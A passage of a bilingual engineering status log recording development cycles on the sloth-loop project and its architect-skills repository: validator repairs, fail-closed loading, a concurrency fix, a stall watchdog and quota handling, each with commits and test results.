### 13.18 cycle-6 B-extra: architect-skills fixed-20261014 对比与合并 (2026-10-19)
- User asked to compare `architect-skills` vs `architect-skills-fixed-20261014/architect-skills`
  (same-day repair bundle, zip +1h) and merge-or-discard under the established mode.
- Read-only diff (SHA256 all files): both 186 files, no only-in files; **17 SKILL.md**
  differ. 15 had EMPTY frontmatter description in current (routing/discovery broken);
  the fixed bundle supplies the full trigger/适用/不适用 text. 2 (agent/context) differed
  only by a UTF-8 BOM (present in current, absent in fixed). rag/security identical.
- Decision: **MERGE** (fixed is a strict additive repair, same day, no conflicts).
  Executed: overwrote the 17 SKILL.md in architect-skills; commit **`86248ac`**.
  Now current == fixed byte-for-byte across all 186 files. Rollback: `git revert 86248ac`.
- Honest note: the bundle-root validator still FAILs on BOTH copies (SKILL.md body
  structure gaps, unrelated to descriptions) - logged as a separate residual, out of scope.
- Evidence: work_ooda/20261018-090000-grand-loop-cycle6-A/B-extra-architect-skills-fixed-comparison.md
### 13.19 cycle-6 B-fix: architect-skills validator 修复（既定模式）- 2026-10-19
- 用户授权：“顺便把架构师 skill 的 validator 修复，使用既定模式”。只读勘测 → 复现 → root cause 定性 → 最小修复 → 回归。
- 复现三个真实失败：
  · tests/validate-architect-skills.mjs = 13 FAIL / 8 PASS（过时：只认 15 atom、期望旧单体 SKILL.md 章节，而现行架构已分层为 SKILL.md+contract.json+guide.md，路由表在 architect-router/guide.md）。
  · architect-skills/tests/run-l1-tests.mjs = crash（render-report.cjs VALID_DIMENSIONS 缺 context/rag/plugin/router）。
  · architect-skills/scripts/validate-contracts.mjs = 3 ERROR（2 个 contract.json 带 UTF-8 BOM；VALID_DIMENSIONS 缺 context/rag）。
- 顺手发现并修的真实内容缺陷：
  · architect-agent/guide.md:141 与 architect-observability/guide.md:44 出现 6 连反引号围栏（代码块未闭）。
  · architect-rag/guide.md 全文 14 处单反引号围栏（图示/python 块未成组）。
  · architect-rag/SKILL.md 行14 引用断行损坏（缺首字母 r）+ “集群模式”应为“蜂群模式”+ “单atom”→“单 atom”。
  · ARCHITECTURE-COVERAGE.md 矩阵只列 15 维，缺新增的 context/rag/plugin/router（补 4 行）。
- 修复：现代化根包 validator（15→18 atom，章节改读 guide.md/contract.json，路由表读 guide.md，撞车词用现行词汇），白名单补齐，去 BOM，修内容缺陷。旧 validator 备份 tests/validate-architect-skills.mjs.cycle6bak。
- 验证（均 exit 0）：root validator 21 checks PASS；run-l1-tests 32/0；validate-contracts 0 error；run-pipeline ALL PASS。
- architect-skills commit **b33f2c5**（10 文件）。与 fixed-20261014 剪影差异 = 仅本轮 10 个文件 + A 的 .git。
- 证据：architect-skills/work_ooda/20261019-100000-architect-skills-validator-repair/（诊断+修单+验证）。

### 13.20 cycle-6 B-增量: CTX-09 + OPS-08 写入契约 - 2026-10-19
- 用户授权：“继续执行 B 增量”。把§13.16 评为“可选增强”的 BV-1/BV-5 作为**有意增量**写入契约（均有真值 backref，非造硬需求）。
- architect-context/CTX-09（新）：压缩前原始事件必须落为可独立读回的 log 层产物（非仅内存/仅摘要），保留可回放 trace/checkpoint；验证=一条重放命令能读回。（open-webui context_compaction.py:300-333；loop context_compactor.py compact_with_checkpoint）
- architect-ops/OPS-08（新）：对外调用必须有背压/限流（滚动窗口），后端不可用时 fail-to-memory 不 fail-open-to-unlimited；enabled=false 为显式审计旁路。（open-webui rate_limit.py:7-136；loop rate_limiter.py cycle-6 A4）
- 同步可发现性：ops guide +5 原则/+清单行/+修复条目；context guide +“可逆性与可回放”章/+清单行；router ops 路由行关键词 +限流/背压。
- 验证（均 exit 0）：root validator 21 PASS；validate-contracts 0 error（ops 8 / ctx 9 条）；run-l1-tests 32/0；run-pipeline ALL PASS。
- architect-skills commit **fe7ce0a**（5 文件）。Open item §13.16 的 BV-1/BV-5 自此 **已闭环**。
- 证据：architect-skills/work_ooda/20261019-100000-architect-skills-validator-repair/04-B-increment.md。
### 13.21 cycle-7 A（Octop 蒸馏）— 2026-10-19
- 目标源：`TencentCloud/Octop`@v1.0.2（本地 `<WORKSPACE_ROOT>\other_project\Octop-source-v1.0.2\Octop`，无 .git → provisional，仅 file:行号）。
- A1 扫描（候选池 C7-1..C7-5，首选 High 的故障域分类+两级熔断）；A2 深度蒸馏（条目落 `docs/knowledge-distillation/agent-orchestration/2026-10-19-octop-failure-scope-*`）；
  A3 三验（V1 可迁移=是 / V2 未落地 / V3 部分有效，结论 candidate → 真缺口）。
- A4 落地（adopted 回填）：
  · 新增 `sloth_engine/failure_scope.py`（FailureScope NONE/MODEL/PROVIDER + 纯函数 classify_failure + provider_of）；
  · 新增 `sloth_engine/failure_scope_registry.py`（ModelHealthRegistry：per-model+per-provider 双回路 / 指数 cooldown base->5x->max / half-open 单飞探针×2）；
  · `orchestrator.py` 构造根绑定 `self.health`（config 驱动）；`project_loader.py` 项目级同步；全为纯追加，现有 CircuitBreaker snapshot/restore 契约不变。
  · 新增 `tests/test_failure_scope.py`（27 例）；全量 1282 passed / 1 xfailed；run_gate --all exit 0（cov 72.91%）。
  · sloth-loop commit **b1cf524**（5 文件，+658）。知识库条目 #5 candidate -> **adopted**（_INDEX N==M==5）。
- A7 判定：蒸馏流程无误（A1->A2->A3->A4 交付齐备：方案落盘 + OODA 留痕 + 测试跑绿 + gate PASS + commit）→ 进 B/C。
- 证据：work_ooda/20261019-140000-grand-loop-cycle7-A/（A1..A4 + ISSUES + AGENT_ERROR_LOG）。
### 13.22 cycle-7 B/C（architect-skills 增量 + loop 评估）— 2026-10-19
- 用户授权：「按照 L1 走，最后用 B 将整个流程吸收学习」。B/C 对象：`architect-skills`（HEAD=fe7ce0a → **911b382**）。
- B 轮（只读勘测 → 归属定性 → 最小增量）：
  · 真值：`architect-agent/contract.json:26-31` AGE-04 与 `architect-net/contract.json:55-56` 均为**单作用域**熔断；
    全仓 grep **无**任一维提「故障域分类」/「两级（模型/提供商）回路」/「cooldown 随失败数升级」。
  · 归属：熔断已被 AGE-04（编排内）与 NET（API 边界）双重覆盖；本增量仅「**多模型/多提供商舰队健康**」细化度，属编排内部 → 正确归 **AGE-04**（非 ops）。
  · 决定：**不新增 OPS-09**（避与 net/agent 边界冲突）；对 AGE-04 做最小词条增强 + guide 新子节。
  · 验证（仅 exit 0）：root validator **21 checks PASS**；run-l1-tests **32/0**；validate-contracts **19 atom 0 error**；run-pipeline **ALL PASS**。
  · architect-skills commit **911b382**（2 文件，+18/-3）。回滚：`git revert 911b382`。
- C 轮（用修正后 architect-skills 全 19 维评估 sloth-loop @ 94495c6）：
  · **covered 11 / partial 6 / N/A 2，无 critical/high**；无本轮强制修复项。
  · 关键增量：⑥agent 维由「有熔断但单作用域」升为**完全命中**增强后的 AGE-04（若未 A4 落地则会被判 partial/high）——B/C 与 A 交叉佐证。
  · 缺口 C7-1..C7-5 均为 ROADMAP 已登记 gated 或可接受（net/security/ops/cost/frontend）。
- 证据：work_ooda/20261019-140000-grand-loop-cycle7-A/（B-correction-assessment.md + C-evaluation-matrix.md）。
- Open item：§13.19 的 OPS-08（限流/背压）与本轮 AGE-04（故障退避）互补，可靠性面已成型。

### 13.23 cycle-7 follow-up: release pack + docs-baseline refresh - 2026-10-19
- Release packaging for handoff: same name/structure as the previous release
  (sloth-loop-0927_release_20261014.zip); old zip preserved in _archive (not overwritten).
  Package = 298 tracked files; dev-context excluded (START.md, docs/flow/*, matches the
  previous release layout); Prompt.md shipped as a placeholder-sanitized copy because
  run_gate -> docs_baseline -> CHECK_FILES cites it (gate stays green in-package).
  Computer checks: 16/16 cycle-4..7 key files, 8/8 required dirs, 0 junk entries, 0 real
  private-path leaks, zip integrity OK.
- docs-baseline refresh (closing the exact P2-5 class the 2026-10-15 stress agent raised):
  docs/baseline.json 1255/72.68% -> 1282/72.91% (HEAD ea097b6, measured post-A4) and all
  9 CHECK_FILES docs synced (25 current-state lines); dated historical snapshots preserved
  (Prompt.md:158, AS-BUILT:158); residual stale = none.
- Full gate after refresh: run_gate.py --all -> PASS (1282 passed / 1 xfailed / 72.91%,
  docs-baseline OK). Zip rebuilt post-commit so the handoff carries the refreshed docs.
- Evidence (gitignored, local): work_ooda/20261019-160000-release-pack-and-baseline-refresh/


### 13.24 stress-test v2 follow-up: P0 fail-closed + report-refs - 2026-10-20
- Source: `loop-test-output/loop-eval-20261020-v2-handoff` (verdict INCOMPLETE/FAIL; native
  Loop delivery defects flagged). Both P0s were independently re-verified against real code
  and real artifacts before fixing (not taken on the report's word):
  (1) `invalid_project_rejected=false` - `project_loader._load_project` silently fell back to
      root defaults on missing project, missing config.yaml, traversal, or config parse error.
  (2) `report_refs=false` - REPORT.md cited `data/<run_id>/<name>.json` while `archive_run`
      wrote `data/<name>.json` (sibling of REPORT.md) -> 7/7 native reports had dangling
      refs; the risk section even self-referenced fabricated lines (report_util.py:128/129).
- Fix (commit `eeba472`): `_load_project` is fail-closed (`_project_fail_closed`) with an
  opt-in legacy fallback (`--allow-missing-project` / `project.allow_missing`); cli_router
  aborts with exit 1. `run_reporter._run_data_dir` is now the single source of truth for the
  archive dir; `data_ref` is threaded through report_util so refs resolve; risk-section refs
  cite real repo docs instead of fabricated line numbers.
- Regression: `tests/test_report_refs_resolve.py` (every `file:line:` ref must resolve on
  disk) and `tests/test_project_failclosed.py` (fail-closed + escape hatch). +10 tests. Also fixed the same-class `--task` fallback in a follow-up commit (`1db526d`).
- E2E: real `orchestrator.py --once` -> REPORT.md 8/8 refs resolve (previously 6 dangling);
  `--once --project no-such-project-xyz` -> `[FAIL-CLOSED]` + exit 1.
- docs-baseline refresh: 1282/72.91% -> 1292/73.05% (HEAD `1db526d`); 9 CHECK_FILES synced
  (22 current-state lines); dated historical snapshots preserved (AS-BUILT:5, Prompt.md:5).
- Full gate: `run_gate.py --all` -> PASS (1292 passed / 1 xfailed / 73.05%, docs-baseline OK).
- Closed in the same class (corrected 2026-10-20; the previous "still open" line here was stale):
  `_load_task_file` (`--task`) was fail-closed in follow-up commit `1db526d` with escape hatch
  `--allow-missing-task`; verified at `sloth_engine/project_loader.py:84/106/114/120`,
  `sloth_engine/cli_router.py:88`, `tests/test_project_failclosed.py:26,65`.
- Still open (G0-G8 next-round): same-project concurrency, full suites, real model calls,
  per-project file sandbox remain.
- Evidence (gitignored, local): `work_ooda/20261020-133000-stress-v2-p0-failclosed-report-refs/`

### 13.25 cycle-8 A: qwen-code stall watchdog adopted + doc pointers fixed - 2026-10-20
- Step A verified baseline `1292/73.05%` @ HEAD `3833f50`; found 5 doc/pointer inconsistencies
  (RECORD: `work_ooda/20261020-141237-grand-loop-cycle8-A/`).
- A1 scanned `<WORKSPACE_ROOT>\other_project`: new candidates coze-studio / lobehub-canary /
  qwen-code (all w/o `.git` -> provisional). A2/A3 distilled 2 entries from qwen-code:
  (a) wall-clock stall watchdog + tool-in-flight suspension + stall-only retry -> **adopted**
      (`sloth_engine/stall_watchdog.py` + `tests/test_stall_watchdog.py`(18), commit `549fb8c`;
      loop-side gap proven: `watchdog|heartbeat|idle_timeout` = 0 hits, only round-count `no_progress_stop`);
  (b) context-scoped subagent tool policy -> **candidate** (maps to the dead `tool_registry.py` branch; scene C).
- Gate: `run_gate.py --all` -> PASS (1310 passed / 1 xfailed / 73.23%, docs-baseline OK).
- Doc fixes (DOC-1/3/4): GRAND-LOOP.md task pointer -> `docs/flow/...`; baseline single-source
  corrected to `docs/baseline.json`; status 13.24 stale `--task` line corrected. DOC-2/DOC-5 remain registered.

### 13.26 cycle-8 C: 16-dim coverage evaluation of sloth-loop + swarm - 2026-10-20
- Input: corrected architect-skills (B-round3, commit `7466ead`; AGE-16/AGE-17 added).
- Output: `docs/design/2026-10-20-cycle8-C-16dim-coverage.md` - a 19-row coverage matrix over
  sloth-loop + swarm; gaps graded against architect-skills `reference/risk-grading-scheme.md`.
- **Stale premise corrected**: "ToolRegistry is a dead branch" is FALSE at this HEAD -
  `orchestrator.py:163` constructs it, `run_once_pipeline.py:280` passes it into the act path,
  `ooda_pipeline.py:352` dispatches registered tools first (covered by `tests/test_tool_registry.py`).
- Gaps (no code adopted this round; evaluate-don't-fix, no padding changes):
  G-1 (medium) AGE-16 hook open: `sloth_engine/stall_watchdog.py` has no call site yet
      (`git grep stall_watchdog -- sloth_engine/*.py` = 0); wiring point = `sub_agent.py:96`.
  G-2 (medium) AGE-17 absent: no context-scoped tool narrowing
      (`git grep -E 'context.*allowlist'` = 0; `pre_approval` = 0).
  G-3 (low) doc correction (done here). G-4 (medium) G0-G8 from the stress handoff remain.
- Next adoptable units: (A) thread a watchdog into `sub_agent.AgentContext` + optional
  `run_subagent(stall_ms)` (additive, default off); (B) context-scoped tool policy gate.

### 13.27 cycle-8 A4-cand-A: stall watchdog wired into sub-agent - 2026-10-20
- Closes G-1 (the AGE-16 follow-up hook) raised in 13.26.
- `sub_agent.py`: `AgentContext` gains an additive `watchdog` field (repr/compare
  excluded, never serialized by `to_dict`); `run_subagent(..., stall_ms=0)` keeps the
  legacy single call when `stall_ms<=0` and guards the executor via
  `stall_watchdog.run_stall_resilient` when `>0` (handle exposed as `context.watchdog`;
  exhausted stalls -> `status="stalled"`); `run_subagents_parallel` threads `stall_ms`.
- Tests: `tests/test_subagent_stall.py` (8). Gate: `run_gate.py --all` -> PASS
  (1318 passed / 1 xfailed / 73.27%). Baseline refreshed 1310/73.23 -> 1318/73.27
  (HEAD `3f8b5b6`).
- Remaining: G-2 (context-scoped tool policy gate) still open; G0-G8 remain.
- Evidence (gitignored, local): work_ooda/20261020-141237-grand-loop-cycle8-A/slices/S5-cycle8-A4candA.md

### 13.28 cycle-8 A4-cand-B: context-scoped tool policy gate (AGE-17) - 2026-10-21
- Closes G-2 (the AGE-17 follow-up unit) raised in 13.26.
- New `sloth_engine/context_tool_policy.py`: faithful port of qwen-code
  `packages/core/src/agents/runtime/subagent-plan-tool-policy.ts` (read-only whitelist @19-34,
  context check @43-45, plan-lifecycle @57-66, pre-approval allow @94-105, claim-only
  @107-130, result-level block @139-153). Exposes READ_ONLY_INSPECTION_TOOLS,
  PLAN_REQUIRED_PRE_APPROVAL_TOOLS, is_pre_approval_claim_only_task_update,
  is_plan_required_pre_approval_allowed_tool, is_plan_lifecycle_tool_unavailable,
  ToolPolicyContext (+ from_agent_context), evaluate_tool_policy, make_context_guard,
  build_policy_blocked_result.
- Wiring is additive + opt-in and reuses the existing monotonic guard seam (no `dispatch()`
  signature change): `ToolRegistry.add_context_tool_policy(context_provider)` appends the gate;
  a denied call returns a normal result-level `blocked` payload (never raises), so the model can
  re-route. `AgentContext` gains two additive fields `plan_required_teammate` / `teammate_name`
  (defaults; `to_dict()` unchanged, so nothing new leaks).
- Tests: `tests/test_context_tool_policy.py` (20). Gate: `run_gate.py --all` -> PASS
  (1338 passed / 1 xfailed / 73.46%). Baseline refreshed 1318/73.27 -> 1338/73.46
  (HEAD `f698d49`; baseline commit `0b30b18`).
- Also this round: README gained an "应用场景的本质" section (commit `30e8262`) stating the
  loop-as-reusable-flow essence, the signals/success_criteria/wrapper contract, and the
  "loop is not an agent (zero-LLM body; quota belongs to the mounting agent)" boundary
  (user request).
- Remaining: G-4 (G0-G8 next round), DOC-2 / DOC-5 (low, registered).
- Evidence (gitignored, local): work_ooda/20261020-141237-grand-loop-cycle8-A/slices/S6-cycle8-A4candB.md
### 13.29 DOC-2 closed + loop-essence positioning landed - 2026-10-21
- README gained a "应用场景的本质" section (commit `30e8262`, user request): loop = reusable-flow
  essence (analyse -> judge right/wrong -> extract rules), the signals/success_criteria/wrapper
  contract, three scenario classes, and the "loop is not an agent (zero-LLM body; the quota belongs
  to the mounting agent)" boundary.
- DOC-2 closed: 3 dangling pointers into the empty `docs/knowledge-distillation/loop-self-scan/`
  tree repointed to the real `docs/flow/...` files (`2026-09-05-grand-loop-task.md:111/125`,
  `sloth-loop-CHANGELOG.md:347`); a same-class dangling `docs/GRAND-LOOP.md` ->
  `docs/flow/GRAND-LOOP.md` (`CHANGELOG:347`) fixed too. 6 pointer tokens total.
  Two historical relocation notes (`sloth-loop-evolution-roadmap-20261009.md:394`,
  `sloth-loop-ROADMAP.md:161`) intentionally keep the old path - they record a past move, not a live ref.
- DOC-5 disposition: ACCEPTED (not a defect). The historical numbers (772 / 1194 passed) sit in files
  whose headers explicitly declare a "2026-09-05 初建快照" (`grand-loop-task.md:16-18`;
  `GRAND-LOOP.md:6-7`). No edit needed.
- Verification: docs-only -> run_gate SKIP (exit 0); docs_baseline OK.
### 13.30 cycle-8 D: backlog roll-up + loop close (A/B/C/D) - 2026-10-21
- Cycle-8 A/B/C/D status:
  A (distill + adopt): 2 entries from qwen-code, both **adopted** — (a) wall-clock stall watchdog
     (`549fb8c`); (b) context-scoped tool policy gate (`f698d49`). A7 verdict: distillation flow sound
     (no new open-audit gaps).
  B (architect-skills): B-round3 `7466ead` (AGE-16/AGE-17 added, validator paths fixed).
  C (16-dim evaluation): `docs/design/2026-10-20-cycle8-C-16dim-coverage.md` (19-row matrix + 4 gaps).
  D (this entry): backlog roll-up + wake anchor refresh.
- Gaps closed this cycle: G-1 (`3f8b5b6`), G-2 (`f698d49`), G-3 (doc, 13.26), DOC-2 (`5fa1037`);
  DOC-5 accepted (headers declare the historical snapshot, grand-loop-task.md:16-18 / GRAND-LOOP.md:6-7).
- Baseline: 1310/73.23 -> **1338/73.46** (head `f698d49`; single source `docs/baseline.json`).
- Remaining open: **G-4** (G0-G8 from the stress handoff), with an explicit feasibility split:
  * feasible in this environment: same-project concurrency probe; per-project file sandbox design/impl;
  * NOT feasible here: real controlled model calls (loop has no LLM client/credentials - see
    `docs/design/loop-vs-agent-quota-and-boundary.md`); the external repos' full build/test suites
    (need those repos' toolchains; the handoff ran them on a separate host).
  Per §0.1#6 this is **reported, not bypassed**: those two items stay queued for a host with an LLM
  mount plus the external toolchains.
- Cycle-8 commit chain: `93a86a6` -> `30e8262`(README essence) -> `f698d49`(A4-cand-B code) ->
  `0b30b18`(baseline) -> `6904ddb`(13.28) -> `5fa1037`(DOC-2 / 13.29).
- Next loop direction (auto): (1) G-4 feasible slice = same-project concurrency + per-project file
  sandbox; or (2) return to step A with the next big-tech distil target from `project-scan-list.md`.

### 13.31 doc-link audit close-out + architect-skills cleanup - 2026-10-21
- Doc-link audit (full `docs/` reference scan; 76 unique missing paths) dispositioned as **NON-DEFECT**.
  New single source of the rule: `docs/CONTEXT.md` -> "引用路径约定" section, classifying the five
  families (private/gitignored dirs; task workspaces `projects/*`; upstream-repo layout; historical
  snapshots; optional external script). Rationale: this repo is the stripped/obfuscated successor of
  sloth-loop-0927, so most hits are intentional; `docs/RELEASE.md` already carries the packaging table.
- Inline fixes in CURRENT-STATE docs only (historical docs left verbatim, per DOC-5 policy):
  * `CLAUDE.md` §5 and `RUNBOOK.md` §9: annotate `--ignore=tests/test_p0_2_rerun.py` as a defensive
    no-op. Git history shows the file **never existed in this repo** -> it is an optional host-side
    script, not a deleted file (`git log --diff-filter=D -- tests/test_p0_2_rerun.py` = empty).
  * `docs/sloth-loop-AS-BUILT.md:80`: `sloth_engine/tests/scripts` -> `sloth_engine/ / tests/ / scripts/`.
  * `docs/adr/ADR-007-orchestrator-run-cli-split.md:25`: `orchestrator/tests/scripts/sloth_engine`
    -> comma-separated path list.
  * same shorthand de-ambiguated in code comments/messages:
    `tests/test_contract_invariants.py:392/396` and `scripts/run_gate.py:95`.
- architect-skills (sibling repo, was HEAD `7466ead`): removed 3 stray tracked backups
  (`guide.md.backup`, `scripts/render-report.cjs_orig.bak`,
  `tests/fixtures/eval-deepseek-harness.json.bak-partial-2026-09-14`) and added
  `*.bak` / `*.backup` / `*.bak-*` / `*_orig.bak` to its `.gitignore` -> commit `9c63f21`.
- **G-4** (stress-handoff G0-G8; verdict INCOMPLETE/FAIL) disposition by user decision:
  per-project file sandbox NOT pursued; same-project concurrency probe queued; real controlled model
  calls + external repos' full suites not feasible here (no LLM client/credentials; external
  toolchains). Registered, not bypassed (§0.1#6) - stays queued for a host with an LLM mount.
- Intentionally untouched: WebUI and `guardian/risk_assessor.py::llm_review()` (user decision);
  `llm_review` remains a documented design gap (`docs/design/loop-vs-agent-quota-and-boundary.md`).
- Baseline: unchanged (1338 / 73.46%; docs-only change, run_gate SKIP, docs_baseline OK).

### 13.32 G-4 feasible slice: F9 same-project concurrency probe + D-F9-1 fix - 2026-10-22
- Gap: the 2026-10-14 stress suite (F2-F8) only exercised MULTI-project parallelism; N runs
  sharing ONE project / runtime / SQLite were never tested - i.e. the handoff's "no systematic
  concurrency" (G-4). Per the 2026-10-21 split this slice is feasible here; the per-project file
  sandbox was NOT pursued (user decision), real-model calls / external suites stay queued.
- Probe (new, outside the repo):
  `<WORKSPACE_ROOT>\loop-test-output\loop-eval-20261022-sameproject-concurrency\` -
  `probe/f9_sameproject_concurrency.py` runs S1 4x concurrent `--once`, S2 4x concurrent continuous,
  S3 4x serial control against one project (`task.name=f9conc`, `max_rounds=1`, mock backtest), and
  records archive-dir count, SQLite `integrity_check`, exit codes and stranded-lock state.
- **Defect D-F9-1 (found + fixed)**: pre-fix S1 -> all four `--once` exited 0 while producing a
  SINGLE archive dir: 3 runs of `data/*.json` + `REPORT.md` were silently overwritten. Root cause:
  (a) the run-dir name was second-granular (`YYYYMMDD-HHMMSS`), so same-second runs collided;
  (b) the `--once` path takes no run lock (only `_run_continuous` does). Fix `b20590f`: atomic claim
  via `mkdir(exist_ok=False)` with `-2/-3/...` suffixes - new `run_reporter.claim_run_ts()` +
  `run_base_dir()` (single source for the `projects/<domain>/<task>` tree) and
  `run_state._claim_run_ts()` called by `_archive_run` / `_write_customer_report`;
  `_report_context()` reuses the claim and stays filesystem-side-effect free, so the legacy 15-char
  form is kept for non-colliding runs. Tests: `tests/test_run_ts_collision.py`(5), incl. 4 real OS
  processes claiming one timestamp.
- Verified post-fix: S1 -> 4 exit 0 AND 4 distinct dirs (`...-114851`, `-2`, `-3`, `-4`);
  S2 -> `[0,2,2,2]` (lock serialization, unchanged); S3 -> 4 dirs; SQLite `integrity_check=ok` in
  all three; no stranded `.loop.lock`.
- Residual (registered, not bypassed): R1 `--once` is still lock-free and `runtime/io/_data` is
  shared, so concurrent runs can interleave that file's content (per-run evidence is preserved by
  the archive snapshot, but contents may cross-talk) -> next cycle: extend the lock to `_run_once`
  and/or give each run its own io dir; R2 no per-project file sandbox (user decision);
  R3 no real model calls / 24h soak (needs an LLM-mounted host).
- Baseline: 1338/73.46 -> **1343/73.50** (head `b20590f`; baseline commit `3da60e1`).

### 13.33 cycle-9 A: coze-studio 异常策略 + lobehub 双窗配额（2 条 adopted）- 2026-10-22
- Step-A 目标：从 `project-scan-list.md` 候选 #7（lobehub-canary / coze-studio-main，"初扫未采"）取下一批蒸馏。
- 侦察范围：coze-studio Go 后端 `domain/workflow/internal/{schema,compose,nodes,repo,execute}`（148 个 .go）；
  lobehub-canary `src/features/Agent*` + `apps/desktop/src/main/modules/heterogeneousAgent/*`。
- **采纳 1（条目 8，coze-studio → adopted）**：步骤级异常策略四元组
  `{timeout_ms, max_retry, process_type, data_on_err}` + 三态 `ErrorProcessType`（throw / exception_branch /
  return_default）+ 兜底路径给输出盖 `isSuccess` 标记 + 中断短路不耗重试。
  证据：`backend/domain/workflow/internal/schema/node_schema.go:87-92`、
  `backend/domain/workflow/internal/compose/node_runner.go:620-643,777-780`。
  落地：`sloth_engine/step_exception_policy.py` + `tests/test_step_exception_policy.py`(10)。
- **采纳 2（条目 9，lobehub-canary → adopted）**：双窗口配额快照（primary 5h + secondary 7d；`usedPercent` 夹取 [0,100]；
  非法百分比丢窗、两窗皆废→`None`；抓取失败**降级为 error snapshot** 而非抛错）+ 幂等消费账本
  （键强制必填、跨 RPC→HTTP 传输复用同一键、独立超时）。
  证据：`apps/desktop/src/main/modules/heterogeneousAgent/codexQuota.ts:18-20,115-122,348-374,613-641`。
  落地：`sloth_engine/quota_window.py` + `tests/test_quota_window.py`(15)。
- 反向样本（V3 必填，开工前 HEAD `766cfdb`）：`git grep -c -E "process_type|exception_branch|return_default|data_on_err" HEAD -- "*.py"`
  与 `git grep -c -E "used_percent|usedPercent|resets_at|resetsAt|windowDurationMins" HEAD -- "*.py"` 均 **0 命中**（exit 1）⇒ 两个缺口为真。
- 未采纳（登记 candidate-pending，非否决）：coze loop 节点图语义（I-1）、batch 并发闸门（I-2，与 `tool_concurrency` 重叠）、
  嵌套迭代断点续跑（I-3，与 loop step-checkpoint 语义重叠）、Redis 中断事件队列（I-4，loop 无 Redis 依赖）。
  全量登记见 `work_ooda/20261022-131900-cycle9-A-coze-lobehub-distill/ISSUES.md`。
- 总账同步：M=9 / N=9（N==M OK）；adopted 7（#1/#2/#5/#6/#7/#8/#9）+ candidate 2（#3/#4）。
  `_INDEX.md` / `SOURCE.md` / `project-scan-list.md` 更新（并修正 `SOURCE.md` 条目 7 的 candidate→adopted 口径漂移）。
- 代码提交：`2a1a180`（4 files / +946）；留痕 `work_ooda/20261022-131900-cycle9-A-coze-lobehub-distill/`。
- 基线：1343/73.50 → **1368/73.79**（+25 用例；head `2a1a180`）。
- 本轮 C/D（16 维复评 + 汇总）与 B（architect-skills 增量：AGE-18 + COS-08）列为后续切片，见该 OODA 目录 `slices/S1` 的"未完成"节。


### 13.34 cycle-9 B/C/D: architect-skills 增量 + 16 维复评 + 回环 - 2026-10-22
- **B（architect-skills 增量，commit `3bff30d`，该仓 `master`）**：
  * `architect-agent/contract.json` +**AGE-18**（步骤级异常策略：数据四元组 `{timeout_ms, max_retry, process_type, data_on_err}`；
    三态 throw/exception_branch/return_default；总尝试 = 重试+1；兜底路径盖 `isSuccess`；中断短路不耗重试），
    并修正 AGE-17 trigger 的 `candidate → adopted（cycle-8 A4-cand-B，条目 7）` 口径漂移；`guide.md` 增原则 16；`SKILL.md` 15→16 条。
  * `architect-cost/contract.json` +**COS-08**（双窗配额快照 + 夹取/丢窗 + 失败降级 error snapshot + 强制幂等键跨传输复用）；
    `guide.md` 增原则 5 与清单行。
  * 清理游离备份 `scripts/render-report.cjs.p9bak`（旧版 renderer 副本）并补 `.gitignore`：`*.p9bak` / `*.p9bak-*`。
  * 验证：`node scripts/validate-contracts.mjs` → 19 atom / 0 错误 / 0 警告；`node tests/run-l1-tests.mjs` → 32 passed / 0 failed。
- **C（16 维复评，`docs/design/2026-10-22-cycle9-C-16dim-coverage.md`）**：
  19 行矩阵（covered 12 / partial 6 / N/A 1，与 cycle-8 同数）。新增两处"机制已落、接线未闭"登记：
  * **G-5（medium）**：`step_exception_policy` 无调用点（`git grep apply_policy\|ExceptionPolicy -- sloth_engine/*.py` 仅命中自身）；
  * **G-6（medium）**：`quota_window` 无真实额度源（`resolve_snapshot` 只能降级到错误快照）。
  承 §13.31/§13.32 的 R1/R2/R3 仍如实登记、未绕过（§0.1#6）。
- **D（回环）**：`docs/flow/GRAND-LOOP.md` 唤醒指针的"当前为"基线刷新（`549fb8c`/1310/73.23% → `561727b`/1368/73.79%），
  并补 cycle-5→cycle-9 提交链锚 + 下一目标（G-5/G-6/R1）。
- 本轮总账：蒸馏 M=N=9（adopted 7 + candidate 2）；基线 1368/73.79；工作树 clean；`run_gate.py --all` PASS。
- 全过声明（D11）：本轮**无遗留阻塞、无执行错误**；未采纳项全部登记（coze I-1..I-4 见 `docs/knowledge-distillation/`，
  维度缺口见 C 文件 §②）；两层仓均无未提交改动。


### 13.35 cycle-10 A/B/C/D: G-5/G-6/R1 接线闭合 + 19 维复评增量 + 回环 - 2026-10-22
- **A（接线闭合，commit `cd54ef3`，11 files / +734/-11，+24 用例）**：§13.34 登记的三处"机制已落、接线未闭"全部闭合。
  * **G-5（medium → closed）**：`step_exception_policy` 接两个真实单步调用点——`sloth_engine/adapters/task_runner.py`
    `BacktestRunner.run`（orchestrator / ooda_pipeline 的 Act 点）与 `sloth_engine/tool_pipeline.py` step 10（tool execution）。
    **opt-in + 默认档逐字节等价**（`ExceptionPolicy()` = 单次尝试 + 原样上抛）；三态兜底沿用 coze `isSuccess` 语义，
    但输出刻意保持 `not_verified` / `not_evaluated`（**执行完成 ≠ 业务成功**，`BacktestRunner.validate_output` 仍判 False）；
    仅当真发生重试才写 `provenance.step_attempts`，故默认结果与 G-5 前逐字节一致。
    判据闭环：`git grep -n "apply_policy\|ExceptionPolicy" -- sloth_engine/*.py sloth_engine/adapters/*.py` 现命中
    `task_runner.py:271` 与 `tool_pipeline.py:193`（此前仅命中模块自身与其测试）。
  * **G-6（medium → closed，残余见 N-3）**：新增 `Orchestrator.quota_probe / quota_provider / quota_cache` +
    `run_loop._quota_snapshot() / _quota_stop_reason()`，在 `run()` 与 `iter_loop()` **每轮开始前**判定；
    `exhausted` → 干净停机（`Quota exhausted (provider=…, next_reset_at=…)`，`status=ok` 非失败、`total_rounds` 不计入）；
    探针抛错或无可用窗口 → 降级 error snapshot / 上次已知快照（degraded=True）兜底，**绝不停机**（fail-soft）；
    无探针时（默认）循环行为完全不变。
  * **R1（承 cycle-9 G-4 残余 → closed）**：`CliRouter._run_once` 与长跑入口共用同一把 `<runtime.root>/.loop.lock`
    （冲突退码 2 且不动原锁；`finally` 释放，异常路径不滞留锁）；3 个 `--once` 单测的 lock stub 由无 API 改为上下文管理器 stub。
- **B（architect-skills 增量，commit `3c6a8be`，该仓 `master`）**：AGE-18 补强（**接线优先** + 默认档行为等价 + `isSuccess≠业务成功`）；
  **新增 AGE-19**（单写者锁必须覆盖所有共享存储变更入口，锁须可判活且全退出路径释放）；`guide.md` 增原则 17/18；`SKILL.md` 16→18 条；
  `architect-cost` COS-08 补强（`exhausted` 驱动停止判定 + 抓取失败绝不停机 + 上次已知快照兜底）+ guide 原则 5 接线段；
